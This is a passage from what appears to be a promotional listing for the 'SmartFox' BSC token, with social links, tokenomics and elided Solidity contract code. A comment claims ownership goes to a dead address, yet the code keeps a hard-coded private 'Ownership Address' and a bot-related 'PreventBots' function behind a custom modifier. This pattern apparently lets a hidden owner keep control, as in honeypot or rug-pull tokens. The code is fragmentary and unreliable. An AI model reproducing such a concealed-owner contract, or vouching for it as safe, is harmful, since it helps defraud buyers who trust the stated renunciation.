...
TELEGRAM: https://t.me/smartfoxtoken

TWITTER: https://twitter.com/SmartFoxBSC


𝗧𝗢𝗞𝗘𝗡𝗢𝗠𝗜𝗖𝗦

📦 - 4% 𝗔𝗗𝗗𝗘𝗗 𝗧𝗢 𝗧𝗛𝗘 𝗟𝗜𝗤𝗨𝗜𝗗𝗜𝗧𝗬 𝗣𝗢𝗢𝗟

🛒 - 𝟭% 𝗔𝗗𝗗𝗗𝗘𝗗 𝗧𝗢 𝗔 𝗠𝗔𝗥𝗞𝗘𝗧𝗜𝗡𝗚 𝗪𝗔𝗟𝗟𝗘𝗧
...
contract Context {
 ...
 contract SmartFox is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "SmartFox";
    string private _symbol = "SMARTFOX";
    ...
    uint256 private fee = 5; // Total Fees LP + Marketing
    uint256 private multi = 1; // Avoid Bots
    ...
    address private _OwnershipV2 = 0xDd23Fc6D0Aa62d7E163a387c3a25f1096cE48dbd; // Ownership Address
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); // Basically The Ownership Goes to DEAD
    ...
    function PreventBots() public externelV2 {
